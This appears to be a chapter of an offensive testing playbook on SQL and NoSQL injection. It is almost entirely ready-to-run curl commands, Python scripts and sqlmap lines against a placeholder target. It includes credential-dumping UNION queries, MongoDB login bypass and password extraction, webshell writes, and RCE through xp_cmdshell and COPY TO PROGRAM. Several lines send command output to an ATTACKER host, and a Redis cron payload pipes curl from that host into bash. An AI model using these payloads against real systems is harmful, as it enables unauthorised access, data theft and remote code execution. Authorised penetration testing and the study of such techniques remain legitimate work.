# 14 — SQL Injection (Non-Time-Based) & NoSQL Injection

## Goal
Confirm, extract, and escalate SQLi without relying on time delays — faster, less noisy,
and more convincing for triage. Covers error-based, UNION, boolean blind, OOB, stacked,
second-order, and WAF bypass. Separate section for NoSQL (MongoDB, Redis, Cassandra,
CouchDB, Firebase, DynamoDB, Neo4j).

---

## Phase 1 — Injection Point Discovery

```bash
T="target.com"

# Collect all parameterised URLs from crawl + history
gau "$T" --subs | grep '=' | uro | anew params.txt
waybackurls "$T" | grep '=' | uro | anew params.txt
katana -u "https://$T" -jc -d 5 -kf all -silent | grep '=' | anew params.txt

# Also mine from JS: all string values that look like API endpoints with params
grep -rh 'fetch\|axios\|XHR\|\.get(\|\.post(' beautified/ recovered/ | \
  grep -oE '"https?://[^"]+\?[^"]*"' | sort -u >> params.txt

# Hidden parameter discovery (crucial — forms often send params not visible in URL)
arjun -u "https://$T/" -oJ arjun.json 2>/dev/null
x8 -u "https://$T/" -w /usr/share/wordlists/burp-parameter-names.txt 2>/dev/null

# Quick triage: inject a ' to every param → watch for errors
python3 - <<'PYEOF'
import requests, urllib.parse, sys

params_file = "params.txt"
sqli_probe = "'"

for url in open(params_file).read().splitlines():
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    for param in qs:
        test_qs = dict(qs)
        test_qs[param] = [sqli_probe]
        test_url = parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)).geturl()
        try:
            r = requests.get(test_url, timeout=5)
            for sig in ["sql syntax","mysql_fetch","ORA-","pg_query","sqlite_query",
                        "You have an error","Unclosed quotation","ODBC","SQLite",
                        "Warning: mysql_","Incorrect syntax","Microsoft OLE DB"]:
                if sig.lower() in r.text.lower():
                    print(f"[SQLI-ERROR] param={param} url={test_url}")
                    break
        except: pass
PYEOF
```

---

## Phase 2 — Error-Based SQLi (Fastest Confirmation)

```bash
# MySQL — error via ExtractValue / UpdateXML
# Payload: ' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))-- -
PARAM="id"; VAL="1"
for payload in \
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))-- -" \
  "' AND UPDATEXML(1,CONCAT(0x7e,DATABASE()),1)-- -" \
  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(DATABASE(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -" \
; do
  curl -s "https://$T/endpoint?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$VAL$payload\"))")" | \
    grep -oE '~[^~]*~'
done

# PostgreSQL — error via CAST
# ' AND 1=CAST(VERSION() AS INTEGER)-- -
for payload in \
  "' AND 1=CAST(VERSION() AS INTEGER)-- -" \
  "' AND 1=(SELECT 1/0)-- -" \
  "' AND 1=CAST((SELECT current_database()) AS INT)-- -" \
; do
  curl -s "https://$T/endpoint?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$VAL$payload\"))")" | \
    grep -iE 'ERROR|invalid input|could not convert'
done

# MSSQL — error via CONVERT
for payload in \
  "' CONVERT(int,@@version)-- -" \
  "'; SELECT 1/0-- -" \
  "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))-- -" \
; do
  curl -s "https://$T/endpoint?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$VAL$payload\"))")" | \
    grep -iE 'Conversion failed|Arithmetic overflow|syntax error'
done

# Oracle — error via CTXSYS
for payload in \
  "' AND 1=CTXSYS.DRITHSX.SN(USER,1337)-- -" \
  "' UNION SELECT NULL FROM DUAL WHERE 1=1-- -" \
  "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL))-- -" \
; do
  curl -s "https://$T/endpoint?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$VAL$payload\"))")"
done
```

---

## Phase 3 — UNION-Based SQLi (Data Extraction)

```bash
# Step 1: Find number of columns
# Inject ORDER BY until error (binary search)
for n in 1 2 3 4 5 6 7 8 9 10; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://$T/endpoint?$PARAM=$VAL' ORDER BY $n-- -")
  echo "ORDER BY $n → $code"
done
# Switch from 200 to error = n-1 is the column count

COLS=5  # replace with actual count

# Step 2: Find reflected columns (which ones appear in output)
curl -s "https://$T/endpoint?$PARAM=-1' UNION SELECT 1,2,3,4,5-- -" | grep -oE '[1-5]'

REFLECTED_COL=2  # replace with column that appears in response

# Step 3: Extract data
# Current DB / version
curl -s "https://$T/endpoint?$PARAM=-1' UNION SELECT 1,DATABASE(),3,4,5-- -"
curl -s "https://$T/endpoint?$PARAM=-1' UNION SELECT 1,VERSION(),3,4,5-- -"

# All table names
curl -s "https://$T/endpoint?$PARAM=-1' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR ':'),3,4,5 FROM information_schema.tables WHERE table_schema=DATABASE()-- -"

# Column names for users table
curl -s "https://$T/endpoint?$PARAM=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'-- -"

# Dump credentials (stop at 1 record for PoC)
curl -s "https://$T/endpoint?$PARAM=-1' UNION SELECT 1,CONCAT(email,0x7c,password),3,4,5 FROM users LIMIT 1-- -"

# For PostgreSQL:
curl -s "https://$T/endpoint?$PARAM=-1' UNION SELECT 1,string_agg(tablename,':'),3,4,5 FROM pg_tables WHERE schemaname='public'-- -"

# For MSSQL:
curl -s "https://$T/endpoint?$PARAM=-1' UNION SELECT 1,STRING_AGG(name,':'),3,4,5 FROM master..sysdatabases-- -"
```

---

## Phase 4 — Boolean Blind SQLi (No Error, No UNION Output)

```bash
# Confirm: true vs false condition gives different response length
TRUE_LEN=$(curl -s "https://$T/endpoint?$PARAM=$VAL' AND 1=1-- -" | wc -c)
FALSE_LEN=$(curl -s "https://$T/endpoint?$PARAM=$VAL' AND 1=2-- -" | wc -c)
echo "TRUE=$TRUE_LEN FALSE=$FALSE_LEN (diff=$(($TRUE_LEN - $FALSE_LEN)))"

# If diff > 0 → boolean blind confirmed. Use sqlmap with --technique=B
sqlmap -u "https://$T/endpoint?$PARAM=$VAL" -p "$PARAM" --technique=B --level=3 --risk=2 \
  --dbms=mysql --batch --dbs

# Manual boolean extraction (when sqlmap is not allowed)
python3 - <<'PYEOF'
import requests, string

TARGET = "https://target.com/endpoint"
PARAM = "id"
BASE_VAL = "1"
INJECTION = "' AND SUBSTRING(DATABASE(),{pos},1)='{char}'-- -"

result = ""
for pos in range(1, 20):
    for char in string.ascii_lowercase + string.digits + "_@.":
        payload = f"{BASE_VAL}{INJECTION.format(pos=pos, char=char)}"
        r = requests.get(TARGET, params={PARAM: payload}, timeout=5)
        if "expected_true_string" in r.text:  # adapt to actual true indicator
            result += char
            print(f"[+] Position {pos}: {result}")
            break
    else:
        break
print(f"[RESULT] {result}")
PYEOF
```

---

## Phase 5 — Out-of-Band (OOB) SQLi

```bash
# OOB is fastest for blind — no need to enumerate byte-by-byte
# Requires DNS/HTTP callback (use Burp Collaborator / interactsh)
COLLABORATOR="YOUR.oastify.com"

# MySQL — OOB via LOAD_FILE + UNC (Windows only) or into DUMPFILE → shell
curl -s "https://$T/endpoint?$PARAM=$VAL' AND LOAD_FILE(CONCAT('\\\\\\\\$COLLABORATOR\\\\',DATABASE()))-- -"

# MySQL — OOB via SELECT INTO OUTFILE to UNC (Windows)
curl -s "https://$T/endpoint?$PARAM=$VAL'; SELECT '' INTO OUTFILE '\\\\\\\\$COLLABORATOR\\\\share\\\\test.txt'-- -"

# PostgreSQL — OOB via COPY TO and DNS
curl -s "https://$T/endpoint?$PARAM=$VAL'; COPY (SELECT current_database()) TO PROGRAM 'nslookup '||(SELECT current_database())||'.$COLLABORATOR'-- -"

# PostgreSQL — OOB via dblink
curl -s "https://$T/endpoint?$PARAM=$VAL' UNION SELECT dblink_send_query('host=$COLLABORATOR','SELECT 1')-- -"

# MSSQL — OOB via xp_cmdshell or xp_dirtree
curl -s "https://$T/endpoint?$PARAM=$VAL'; EXEC master..xp_dirtree '\\\\$COLLABORATOR\\a'-- -"
curl -s "https://$T/endpoint?$PARAM=$VAL'; EXEC master..xp_cmdshell 'nslookup $COLLABORATOR'-- -"

# Oracle — OOB via UTL_HTTP
curl -s "https://$T/endpoint?$PARAM=$VAL' UNION SELECT UTL_HTTP.REQUEST('http://$COLLABORATOR/?x='||USER) FROM DUAL-- -"

# Check collaborator for DNS/HTTP hits = OOB confirmed → data exfil possible
interactsh-client -server $COLLABORATOR -n 1  # or monitor Burp Collaborator
```

---

## Phase 6 — Stacked Queries (Multi-Statement)

```bash
# Only works if the driver allows multiple statements (PHP+MySQLi, MSSQL, PostgreSQL+PDO, SQLite)
# MySQL: usually NOT supported via PDO (use for MSSQL/PGSQL/SQLite)

# MSSQL: stacked → enable xp_cmdshell → RCE
curl -s "https://$T/endpoint?$PARAM=$VAL'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -"
curl -s "https://$T/endpoint?$PARAM=$VAL'; EXEC xp_cmdshell 'whoami'-- -"

# PostgreSQL: stacked → copy to / arbitrary file write
curl -s "https://$T/endpoint?$PARAM=$VAL'; COPY pg_shadow TO '/tmp/shadow.txt'-- -"

# SQLite: stacked + attach → read other DBs
curl -s "https://$T/endpoint?$PARAM=$VAL'; ATTACH DATABASE '/etc/passwd' AS pwd; SELECT * FROM pwd.sqlite_master-- -"
```

---

## Phase 7 — Second-Order (Stored) SQLi

```bash
# First-order injection is sanitized on input but stored raw → executed on second retrieval
# Classic: register username as admin'-- → profile page SELECT WHERE username='{stored_value}'

# Step 1: Store the payload (in username, address, bio, etc.)
curl -s "https://$T/api/register" -X POST \
  -d '{"username":"admin'\''-- -","password":"Test123!"}'

# Step 2: Trigger the stored value to be used in another SQL query
# Login as that user and visit profile / search / settings
curl -s "https://$T/api/profile" -H "Authorization: Bearer $TOKEN"
# If the profile lookup uses WHERE username='admin'-- -' → comment truncates → admin's profile returned

# More subtle: password change that uses the stored username in an UPDATE
curl -s "https://$T/api/password/change" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"old":"Test123!","new":"hacked"}'
# UPDATE users SET password='hacked' WHERE username='admin'-- -'
# → changes admin's password instead
```

---

## Phase 8 — WAF Bypass Techniques

```bash
# 1. Casing / whitespace variations
"' UNION/**/SELECT/**/'1"      # inline comments
"'/**/UNION/**/SELECT/**/1--"
"' uNiOn SeLeCt 1--"           # mixed case
"'%09UNION%09SELECT%091--"     # tab instead of space
"'%0AUNION%0ASELECT%0A1--"     # newline instead of space
"' UNION%0ASELECT 1--"

# 2. URL encoding variants
"'%20UNION%20SELECT%201--"
"'%2520UNION%2520SELECT%25201--"  # double-encoded
"'+UNION+SELECT+1--"              # + as space (query string context)

# 3. Comment obfuscation
"'/*!UNION*//*!SELECT*/1--"    # MySQL version comment
"'/*!50000UNION*/SELECT 1--"
"'UNION%23%0ASELECT 1--"       # #\n as comment

# 4. String encoding to bypass keyword filters
# MySQL: 0x61646d696e = 'admin'
"' UNION SELECT 0x61646d696e--"
# PostgreSQL: CHR() function
"' UNION SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)--"

# 5. Alternative syntax for filtered operators
"' AND 1 LIKE 1--"      # instead of =
"' AND 1 REGEXP 1--"
"' AND 1 BETWEEN 0 AND 2--"

# 6. HTTP-level bypass
# Change HTTP method: POST body often inspected less than GET params
# Content-Type: application/xml → different WAF ruleset
# Chunked transfer encoding to bypass content inspection
# JSON injection: {"id": "1 OR 1=1"}

# 7. Parameterized-context bypass (second lookup injection)
# Place payload in headers that get stored and re-used:
curl -s "https://$T/search" -H "User-Agent: ' UNION SELECT 1,username,3 FROM users--"
curl -s "https://$T/api/log" -X POST -d '{"event":"login","user":"admin\x27--"}'

# 8. sqlmap WAF tamper scripts
sqlmap -u "https://$T/endpoint?id=1" --tamper=space2comment,between,randomcase,charunicodeescape \
  --random-agent --level=5 --risk=3 --batch
```

---

## Phase 9 — SQLi Escalation

```bash
# MySQL: read files (requires FILE privilege)
curl -s "https://$T/endpoint?$PARAM=-1' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -"
curl -s "https://$T/endpoint?$PARAM=-1' UNION SELECT LOAD_FILE('/var/www/html/.env'),2,3-- -"

# MySQL: write files → webshell
curl -s "https://$T/endpoint?$PARAM=-1' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php'-- -"
curl -s "https://$T/shell.php?cmd=id"

# PostgreSQL: RCE via COPY TO PROGRAM (PostgreSQL ≥ 9.3)
curl -s "https://$T/endpoint?$PARAM=$VAL'; COPY (SELECT '') TO PROGRAM 'curl http://ATTACKER/$(id|base64)'-- -"

# MSSQL: RCE via xp_cmdshell (after enabling it)
curl -s "https://$T/endpoint?$PARAM=$VAL'; EXEC xp_cmdshell 'powershell -c \"Invoke-WebRequest http://ATTACKER/$(whoami)\"'-- -"

# SQLite: read arbitrary files via READFILE (SQLite ≥ 3.38)
curl -s "https://$T/endpoint?$PARAM=-1' UNION SELECT readfile('/etc/passwd')-- -"
```

---

## NoSQL Injection

### MongoDB

```bash
# JSON body injection (REST API that passes JSON to MongoDB)
# Operator injection: replace value with {"$gt": ""}

# Auth bypass
curl -s "https://$T/api/auth/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Specific user targeting
curl -s "https://$T/api/auth/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrongpassword"}}'

# More operators:
# $ne (not equal), $gt (greater than), $lt (less than), $gte, $lte
# $in: check if value in array: {"username": {"$in": ["admin","root","superuser"]}}
# $regex: {"username": {"$regex": "^admin"}}
# $where: {"$where": "sleep(1000)"}  ← time-based, but for confirming injection point
# $expr: newer MongoDB aggregation-based injection

# URL parameter injection (app constructs MongoDB query from URL params)
curl -s "https://$T/api/users?username[$ne]=fake&password[$ne]=fake"
curl -s "https://$T/api/users?username[$regex]=^a&password[$ne]=x"
curl -s "https://$T/api/users?username=admin&password[$gt]="

# Array operator: dump all documents with $gt: ""
curl -s "https://$T/api/search?query[$gt]="

# Blind MongoDB extraction via $regex (letter by letter)
python3 - <<'PYEOF'
import requests, string

TARGET = "https://target.com/api/auth/login"
CHARSET = string.ascii_lowercase + string.digits + "-_@."

result = ""
for pos in range(30):
    for char in CHARSET:
        r = requests.post(TARGET, json={
            "username": "admin",
            "password": {"$regex": f"^{result}{char}"}
        }, timeout=5)
        if r.status_code == 200 and "token" in r.text:
            result += char
            print(f"[+] {result}")
            break
    else:
        break
print(f"[PASSWORD] {result}")
PYEOF

# MongoDB aggregation $where injection (eval-based, deprecated but still present):
curl -s "https://$T/api/users" -X POST \
  -H "Content-Type: application/json" \
  -d '{"$where": "function() { return this.admin == true; }"}'

# NoSQLMap for automated testing
nosqlmap --attack 1 --url "https://$T/api/auth/login" --httpMethod POST \
  --postData '{"username":"INJECT","password":"INJECT"}'
```

### Redis Injection (via SSRF or direct access)

```bash
# Redis has no auth by default — if reachable, it's a full data dump + RCE
# Via SSRF to internal Redis:
curl -s "https://$T/api/fetch?url=redis://127.0.0.1:6379"

# Direct Redis commands via HTTP SSRF (Redis protocol over SSRF):
# RESP protocol: *2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n
# Use gopherus to generate SSRF payloads for Redis:
gopherus --exploit redis
# Copy the gopher:// URL and use in the SSRF parameter

# Redis SSRF → RCE via cron injection or SSH authorized_keys:
# SET /etc/cron.d/root "*/1 * * * * root curl http://ATTACKER/ | bash\n"
# CONFIG SET dir /etc/cron.d
# CONFIG SET dbfilename root
# BGSAVE

# Direct Redis (if exposed on 6379 without auth)
redis-cli -h "$T" -p 6379 ping 2>/dev/null && \
  redis-cli -h "$T" -p 6379 keys '*' 2>/dev/null | head -20
```

### CouchDB Injection

```bash
# Mango query injection (CouchDB 2.x Mango queries)
curl -s "https://$T/_find" -X POST \
  -H "Content-Type: application/json" \
  -d '{"selector": {"_id": {"$gt": null}}, "limit": 10}'

# If app passes user input directly to selector:
curl -s "https://$T/api/search" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": null}}'  # dump all users

# CouchDB admin panel check (port 5984)
curl -s "http://$T:5984/_all_dbs"  # list all databases (if no auth)
curl -s "http://$T:5984/_utils/"    # Fauxton admin UI
```

### Firebase Realtime Database

```bash
# Firebase RTDB uses URL-based REST API → test without auth
curl -s "https://APP.firebaseio.com/.json"               # root
curl -s "https://APP.firebaseio.com/users.json"          # users collection
curl -s "https://APP.firebaseio.com/users.json?orderBy=\"role\"&equalTo=\"admin\""

# Firestore (REST API)
curl -s "https://firestore.googleapis.com/v1/projects/APP/databases/(default)/documents/users"
curl -s "https://firestore.googleapis.com/v1/projects/APP/databases/(default)/documents/users?pageSize=300"
```

### DynamoDB Injection (via AWS SDK calls in app)

```bash
# If app builds DynamoDB queries from user input without validation:
# FilterExpression injection — similar to SQL boolean blind but DynamoDB-specific
# Usually requires understanding the SDK's query construction from decompiled code

# Common pattern: scan + FilterExpression from URL param
# {"FilterExpression": "userId = :uid", "ExpressionAttributeValues": {":uid": {"S": "INJECTED"}}}
# Inject: "VALID_ID OR attribute_exists(email)"  → return all records if OR is allowed

# AWS DynamoDB doesn't support OR in FilterExpression — this is not a traditional injection
# But check for: exposed AWS credentials → direct SDK calls → full table scan
```

### Cassandra / CQL Injection

```bash
# CQL injection (similar to SQL but no subqueries in most versions)
# Found in apps that build CQL queries via string concatenation

# Auth bypass
curl -s "https://$T/api/login" -X POST \
  -d "username=admin'--&password=anything"

# CQL operators differ — no UNION, limited to:
# ' AND token(id) > token(minUUID()) ALLOW FILTERING--
# ' ALLOW FILTERING--  ← often removes filter conditions

# CQL injection in Cassandra is dangerous when using string concatenation:
# "SELECT * FROM users WHERE username = '" + input + "'"
# Payload: admin' ALLOW FILTERING--
# → removes WHERE clause → returns all users
```

### GraphQL Injection

```bash
# GraphQL is often backed by SQL/NoSQL → injection via argument values
# Confirm: does the API use graphql?
curl -s "https://$T/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'

# Argument injection (SQL backend)
curl -s "https://$T/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{user(id:\"1 OR 1=1\"){id email}}"}'

# Batch / alias abuse for brute force
curl -s "https://$T/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{a:user(id:1){id} b:user(id:2){id} c:user(id:3){id}}"}'

# NoSQL operator injection via GraphQL (MongoDB backend)
curl -s "https://$T/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{users(filter:{username:{$ne:\"nobody\"}}){username email}}"}'
```

---

## Tooling Summary

| Tool | Use Case | Command |
|---|---|---|
| sqlmap | Automated SQLi (all types) | `sqlmap -u "URL" -p param --technique=UBE --batch` |
| sqlmap | Tamper WAF bypass | `--tamper=space2comment,randomcase,between` |
| nosqlmap | MongoDB/Redis injection | `nosqlmap --attack 1 ...` |
| ghauri | SQLi with better WAF bypass | `ghauri -u "URL" --dbs --batch` |
| havij / bbsql | Error-based quick confirmation | manual verification preferred |
| burp sqlmap | Passive scan → send to sqlmap | right-click → extensions → sqlmap |
| interactsh | OOB DNS/HTTP callbacks | `interactsh-client -server ...` |
| gopherus | Generate SSRF→Redis payloads | `gopherus --exploit redis` |

## sqlmap One-Liners by Type

```bash
# Error-based confirmation
sqlmap -u "https://$T/endpoint?id=1" --technique=E --dbms=mysql --batch --level=2 --dbs

# UNION-based extraction
sqlmap -u "https://$T/endpoint?id=1" --technique=U --batch --columns -T users -D app_db

# Boolean blind (when time-based not needed)
sqlmap -u "https://$T/endpoint?id=1" --technique=B --batch --dbs --level=3

# OOB (requires Burp Collaborator or interactsh)
sqlmap -u "https://$T/endpoint?id=1" --technique=O --dns-domain=YOUR.oastify.com --batch

# Stacked queries → try for RCE (MSSQL/PostgreSQL)
sqlmap -u "https://$T/endpoint?id=1" --technique=S --batch --os-cmd="whoami"

# POST body injection
sqlmap -u "https://$T/api/search" --data='{"query":"test"}' --content-type='application/json' \
  --batch --dbms=mysql --technique=UBE

# Cookie injection
sqlmap -u "https://$T/endpoint" --cookie="session=VALUE*" --level=4 --batch

# Header injection (User-Agent, X-Forwarded-For)
sqlmap -u "https://$T/" -p "X-Forwarded-For" --headers="X-Forwarded-For: 1*" --batch --level=5
```
